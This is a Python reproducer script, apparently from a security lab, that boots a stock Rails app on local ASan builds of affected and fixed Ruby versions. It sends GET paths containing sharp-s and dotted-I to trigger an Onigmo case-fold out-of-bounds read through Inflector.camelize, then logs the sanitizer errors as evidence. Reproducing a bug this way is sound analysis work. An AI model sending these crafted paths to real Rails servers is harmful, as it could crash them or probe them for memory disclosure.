#!/usr/bin/env python3
"""Stock Rails wire probe for the Onigmo case-fold OOB read via Inflector.

The unmodified Rails app is booted from lab/build/rails-stock-app with pinned
ASan builds.  Each request uses an ordinary loopback GET whose path segment
contains sharp-s / capital sharp-s / dotted-I; Rails' controller resolution
runs ActiveSupport::Inflector.camelize on the path-derived name.  No app file,
middleware, preload or debugger is in the path.  This is an analysis reproducer,
not an RCE claim.

Evidence is written under lab/build/evidence/casefold-inflector-wire/.
"""
from __future__ import annotations

import http.client
import json
import os
from pathlib import Path
import resource
import subprocess
import time
from urllib.parse import quote

ROOT = Path(__file__).resolve().parents[2]
EV = ROOT / "lab/build/evidence/casefold-inflector-wire"
APP = ROOT / "lab/build/rails-stock-app"
RUBIES = {
    "affected": ROOT / "lab/build/ruby-3.4.12-asan/bin/ruby",
    "fixed": ROOT / "lab/build/ruby-3.4.13-asan/bin/ruby",
}
GEMS = {
    "affected": ROOT / "lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0",
    "fixed": ROOT / "lab/build/plain/ruby-3.4.13-plain/lib/ruby/gems/3.4.0",
}
PATHS = [
    "s\u00df", "\u00dfs", "\u00df", "s", "ss", "\u1e9es", "\u0130s",
    "status\u00df", "s\u00df\u00df",
]


def no_core() -> None:
    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))


def wait_ready(proc: subprocess.Popen, port: int, seconds: float = 30) -> bool:
    deadline = time.monotonic() + seconds
    while time.monotonic() < deadline:
        if proc.poll() is not None:
            return False
        try:
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=1)
            conn.request("GET", "/")
            conn.getresponse().read()
            conn.close()
            return True
        except OSError:
            time.sleep(0.3)
    return False


def run(label: str, port: int) -> dict:
    EV.mkdir(parents=True, exist_ok=True)
    ruby, gems = RUBIES[label], GEMS[label]
    log_path = EV / f"{label}.server.log"
    result_path = EV / f"{label}.json"
    env = os.environ.copy()
    env["GEM_PATH"] = str(gems) + ((":" + env["GEM_PATH"]) if env.get("GEM_PATH") else "")
    env["RAILS_MAX_THREADS"] = "1"
    env["UBSAN_OPTIONS"] = "halt_on_error=0:print_stacktrace=0"
    env["ASAN_OPTIONS"] = "detect_leaks=0:abort_on_error=0"
    pid_path = EV / f"{label}.pid"
    command = [str(ruby), str(APP / "bin/rails"), "server", "-b", "127.0.0.1",
               "-p", str(port), "--pid", str(pid_path)]
    rows = []
    with log_path.open("wb") as log:
        proc = subprocess.Popen(command, cwd=ROOT, env=env, stdout=log,
                                stderr=subprocess.STDOUT, preexec_fn=no_core)
        try:
            ready = wait_ready(proc, port)
            if ready:
                for word in PATHS:
                    path = "/" + quote(word, safe="")
                    asan_before = log_path.read_bytes().count(b"ERROR: AddressSanitizer")
                    try:
                        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
                        conn.request("GET", path)
                        resp = conn.getresponse()
                        body = resp.read()
                        conn.close()
                        status = resp.status
                        nbytes = len(body)
                    except OSError as exc:
                        status, nbytes = repr(exc), -1
                    asan_after = log_path.read_bytes().count(b"ERROR: AddressSanitizer")
                    rows.append({"word": word, "path": path, "status": status,
                                 "bytes": nbytes, "asan_new": asan_after - asan_before})
                    if asan_after - asan_before:
                        break
            result = {"label": label, "ruby": str(ruby.relative_to(ROOT)),
                      "ready": ready, "proc_rc": proc.poll(), "rows": rows}
        finally:
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait(timeout=5)
            pid_path.unlink(missing_ok=True)
    result_path.write_text(json.dumps(result, ensure_ascii=False, indent=2) + "\n")
    print(json.dumps(result, ensure_ascii=False))
    return result


if __name__ == "__main__":
    run("affected", 4631)
    run("fixed", 4632)
